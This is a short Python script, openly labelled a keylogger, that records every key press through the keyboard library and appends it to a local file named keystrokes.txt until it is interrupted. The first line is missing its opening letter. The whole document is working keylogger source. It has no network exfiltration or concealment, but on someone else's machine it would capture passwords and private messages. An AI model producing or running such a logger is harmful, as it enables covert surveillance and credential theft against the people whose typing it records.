mport keyboard  
import time

log_file = "keystrokes.txt"

def on_key_press(event):
    with open(log_file, "a") as f:  
        f.write(f"{event.name}")  
keyboard.on_press(on_key_press)
print("Keylogger started. Press 'Ctrl + C' to stop.")
try:
    while True:
        time.sleep(1) 
except KeyboardInterrupt:
    print("\nKeylogger stopped. Check 'keystrokes.txt' for logged keys.")
